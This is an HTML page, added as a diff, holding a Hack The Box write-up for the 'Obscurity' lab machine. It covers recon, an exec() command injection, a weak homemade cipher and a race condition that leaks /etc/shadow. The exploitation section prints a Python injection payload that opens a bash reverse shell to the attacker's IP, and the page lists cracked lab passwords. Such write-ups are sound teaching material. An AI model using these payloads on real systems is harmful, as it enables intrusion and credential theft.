@@ -1,0 +1,711 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Obscurity - Hack The Box - hackcommander.io</title>
+<meta name="description" content="The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user’s password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Obscurity - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-obscurity/">
+
+
+  <meta property="og:description" content="The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user’s password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-obscurity/obscurity_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-05-09T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-obscurity/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Obscurity - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Obscurity - Hack The Box">
+    <meta itemprop="description" content="The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user’s password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.">
+    <meta itemprop="datePublished" content="May 09, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Obscurity - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-05-09T00:00:00+02:00">May 09, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-obscurity/obscurity_logo.png" alt="" /></p>
+
+<p>The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user’s password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Find the secret directory on the webserver that holds the source code for the web application</li>
+  <li>Exploit a command injection vulnerability in the application and get a shell as www-data</li>
+  <li>Recover the key for some homemade crypto cipher and recover the password for user robert</li>
+  <li>Exploit a race condition in yet another python program so I can read the shadow file and crack the root password</li>
+</ul>
+
+<h2 id="recon">Recon</h2>
+
+<p>I see there’s a custom webserver when I run my nmap scan: <code class="language-plaintext highlighter-rouge">BadHTTPServer</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@beholder:~# nmap -sC -sV -p- 10.10.10.168
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 15:25 EST
+Nmap scan report for obscurity.htb (10.10.10.168)
+Host is up (0.025s latency).
+Not shown: 65531 filtered ports
+PORT     STATE  SERVICE
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open  http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 30 Nov 2019 20:29:55
+|     Server: BadHTTPServer
+|     Last-Modified: Sat, 30 Nov 2019 20:29:55
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     &lt;!DOCTYPE html&gt;
+[...]
+9000/tcp closed cslistener
+
+Nmap done: 1 IP address (1 host up) scanned in 88.39 seconds
+</code></pre></div></div>
+
+<h2 id="website">Website</h2>
+
+<p>So this company is taking a unique approach based on security by obscurity, what could go wrong? It’s pretty clear I’m gonna have to exploit a custom webserver here based on the notes from the webpage. It also says they’re working on a new encryption algorithm and a replacement for SSH. I’m sure the folks from Crown Sterling would be interested in this crypto vaporware garbage!</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/website1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/website2.png" alt="" /></p>
+
+<p>Looks like these guys haven’t discovered email yet and they use their public website to message their developpers instead. I’m now going to be looking for that directory that holds the <code class="language-plaintext highlighter-rouge">SuperSecureServer.py</code> file next.</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/website3.png" alt="" /></p>
+
+<h2 id="fuzzing-the-webserver-to-find-the-source-code">Fuzzing the webserver to find the source code</h2>
+
+<p>I’m going to fuzz the directories to try to find the location of that file with the python source.</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/ffuf.png" alt="" /></p>
+
+<p>The server source code is located here: <code class="language-plaintext highlighter-rouge">http://10.10.10.168:8080/develop/SuperSecureServer.py</code></p>
+
+<h2 id="exploiting-the-command-injection-vulnerability-in-the-source-code">Exploiting the command injection vulnerability in the source code</h2>
+
+<p>A quick source code review shows that an <code class="language-plaintext highlighter-rouge">exec()</code> call is made here:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
+</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
+</span>            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
+                <span class="n">path</span> <span class="o">=</span> <span class="s">"/index.html"</span>
+            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">exec</code> function is just like an <code class="language-plaintext highlighter-rouge">eval</code>, it’ll execute whatever python code has been passed to it. Here’s documentation snippet:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec(source, globals=None, locals=None, /)
+    Execute the given source in the context of globals and locals.
+    
+    The source may be a string representing one or more Python statements
+    or a code object as returned by compile().
+    The globals must be a dictionary and locals can be any mapping,
+    defaulting to the current globals and locals.
+    If only globals is given, locals defaults to it.
+</code></pre></div></div>
+
+<p>So what the program does here is take the path in the GET request, formats it and stores the result in the <code class="language-plaintext highlighter-rouge">output</code> variable. Here’s what happen if I test that part of the code manually in the python interactive interpreter.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; exec("output = 'Document: {}'".format("/test"))
+&gt;&gt;&gt; output
+'Document: /test'
+</code></pre></div></div>
+
+<p>That <code class="language-plaintext highlighter-rouge">output</code> variable is not even used in the program and has been placed here just to introduce that command injection vulnerability. What I can do here is store an empty value in the <code class="language-plaintext highlighter-rouge">output</code> variable but add additional code after the <code class="language-plaintext highlighter-rouge">output</code> variable assignment.</p>
+
+<p>I’ll test this locally first in my python shell, first I’ll validate that I can execute <code class="language-plaintext highlighter-rouge">whoami</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; exec("output = 'Document: {}'".format("';__import__(\"os\").system(\"whoami\")#'"))
+root
+</code></pre></div></div>
+
+<p>Ok so that works. Next I’ll spawn a reverse shell with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; exec("output = 'Document: {}'".format("';__import__(\"os\").system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1'\")#'"))
+
+root@beholder:~# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38520
+</code></pre></div></div>
+
+<p>Awesome, next destination: getting a shell on the target box.</p>
+
+<p>I’ll use the <code class="language-plaintext highlighter-rouge">';__import__("os").system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'")#</code> payload and URL-encode all the characters so I don’t have any problems with my curl command. The exec/eval works and I get a shell.</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/shell.png" alt="" /></p>
+
+<h2 id="cracking-roberts-password">Cracking robert’s password</h2>
+
+<p>I have access to robert’s home directory but I can’t read the flag so I have to get access to his account next.</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/robert.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">check.txt</code> file is the plaintext, and <code class="language-plaintext highlighter-rouge">out.txt</code> is the ciphertext:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert$ cat check.txt
+Encrypting this file with your key should result in out.txt, make sure your key is correct!
+
+www-data@obscure:/home/robert$ xxd out.txt
+xxd out.txt
+00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
+00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
+00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
+00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
+00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
+00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
+00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
+00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
+00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
+00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
+000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
+000000b0: c38c c397 c289 c281 76                   ........v
+</code></pre></div></div>
+
+<p>What I really want to read is the <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> but it’s also encrypted:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@obscure:/home/robert$ xxd passwordreminder.txt
+xxd passwordreminder.txt
+00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381  ................
+00000010: c391 c3a9 c2af c2b7 c2bf 6b              ..........k
+</code></pre></div></div>
+
+<p>Here I’ll assume that the key used to encrypt <code class="language-plaintext highlighter-rouge">check.txt</code> is the same as <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> otherwise I won’t be able to do much.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> program uses addition and modulo to encrypt/decrypt the files:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">encrypted</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">decrypted</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>The encryption works a bit like XOR where if you have the plaintext and ciphertext you can recover the key by XORing the two together. To recover the key here, I’ll take the out.xt ciphertext text and decrypt it with the plaintext and this’ll write the key into my x.txt output file.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 ./SuperSecureCrypt.py <span class="nt">-d</span> <span class="nt">-i</span> out.txt <span class="nt">-k</span> <span class="s1">'Encrypting this file with your key should result in out.txt, make sure your key is correct!'</span> <span class="nt">-o</span> x.txt
+<span class="gp">#</span><span class="c">###############################</span>
+<span class="gp">#</span><span class="w">           </span>BEGINNING          <span class="c">#</span>
+<span class="gp">#</span><span class="w">    </span>SUPER SECURE ENCRYPTOR    <span class="c">#</span>
+<span class="gp">#</span><span class="c">###############################</span>
+<span class="gp">  #</span><span class="c">###########################</span>
+<span class="gp">  #</span><span class="w">        </span>FILE MODE         <span class="c">#</span>
+<span class="gp">  #</span><span class="c">###########################</span>
+<span class="go">Opening file out.txt...
+Decrypting...
+Writing to x.txt...
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>x.txt
+<span class="go">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
+</span></code></pre></div></div>
+
+<p>I’ll use <code class="language-plaintext highlighter-rouge">alexandrovich</code> as the decryption key for <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> to recover the SSH password for user robert: <code class="language-plaintext highlighter-rouge">SecThruObsFTW</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 ./SuperSecureCrypt.py -d -i passwordreminder.txt -o x.txt -k 'alexandrovich'
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to x.txt...
+
+$ cat x.txt
+SecThruObsFTW
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-obscurity/flag1.png" alt="" /></p>
+
+<h2 id="privesc">Privesc</h2>
+
+<p>The privesc is pretty obvious, there’s a python script running as root and we need to exploit it. As stated on their website, this is their own proprietary SSH program.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:~$ sudo -l
+Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+</code></pre></div></div>
+
+<p>In short, there’s a race condition in the program where it copies the contents of <code class="language-plaintext highlighter-rouge">/etc/shadow</code> to a temporary location then deletes the file. The sleep command introduces a delay we can exploit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">passwords</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span> 
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(.</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>The copied shadow file is stored in <code class="language-plaintext highlighter-rouge">/tmp/SSH/</code> for a few milliseconds so it’s possible to read it by running a bash loop to copy it outside of the <code class="language-plaintext highlighter-rouge">/tmp/SSH</code> directory before it is deleted:</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/shadow.png" alt="" /></p>
+
+<p>Time to crack that hash!</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/john.png" alt="" /></p>
+
+<p>Password is <code class="language-plaintext highlighter-rouge">mercedes</code>. We can now <code class="language-plaintext highlighter-rouge">su</code> root:</p>
+
+<p><img src="/assets/images/htb-writeup-obscurity/flag2.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#custom-webserver" class="page__taxonomy-item" rel="tag">custom webserver</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#race-condition" class="page__taxonomy-item" rel="tag">race condition</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-05-09T00:00:00+02:00">May 09, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-openadmin/" class="pagination--pager" title="OpenAdmin - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-resolute/" class="pagination--pager" title="Resolute - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
